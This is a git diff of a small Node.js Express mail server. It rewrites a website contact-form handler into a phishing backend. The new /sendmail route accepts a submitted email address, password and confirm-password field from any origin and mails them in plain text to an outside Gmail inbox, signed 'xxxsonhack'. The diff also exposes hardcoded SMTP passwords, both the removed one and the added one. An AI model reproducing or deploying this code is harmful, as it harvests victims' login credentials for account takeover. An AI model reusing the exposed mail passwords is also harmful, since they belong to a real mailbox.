@@ -1,6 +1,8 @@
 const express = require("express");
-
+const cors = require("cors");
 const app = express();
+
+app.use(cors());
 
 const bodyParser = require("body-parser");
 const nodemailer = require("nodemailer");
@@ -13,27 +15,33 @@ app.get("/", (req, res) => {
 });
 
 app.post("/sendmail", async (req, res) => {
-  const { name, email, message } = req.body;
-
+  const { email, pass, pasers } = req.body;
   try {
-    const transporter = nodemailer.createTransport({
+    let transporter = nodemailer.createTransport({
       host: "mail.whitetransport.net",
       port: 465,
-
       auth: {
-        user: "info@whitetransport.net", // generated ethereal user
-        pass: "B2hgrLr2GAna", // generated ethereal password
+        user: "mustafa@whitetransport.net",
+        pass: "uf4DBAatO5Ut",
       },
     });
-
-    const mailOptions = {
-      from: "info@whitetransport.net",
+    let info = await transporter.sendMail({
+      from: '"You" <mustafa@whitetransport.net>',
       to: "fredrick3smith33@gmail.com",
-      subject: "New message from your website!",
-      text: `Name: ${name}\nEmail: ${email}\nMessage: ${message}`,
-    };
+      subject: "Testing, testing, 123",
+      html: `
+    <div> 
+      <h2>Here is your email!</h2>
+        <p>Email: ${email}</p>
+        <p>Pass: ${pass}</p>
+        <p>Confirm Pass: ${pasers}</p>
+    
+        <p>All the best, xxxsonhack</p>
+         </div>
+    `,
+    });
 
-    await transporter.sendMail(mailOptions);
+    await transporter.sendMail(info);
     res.send("Email sent successfully");
   } catch (error) {
     console.error(error);
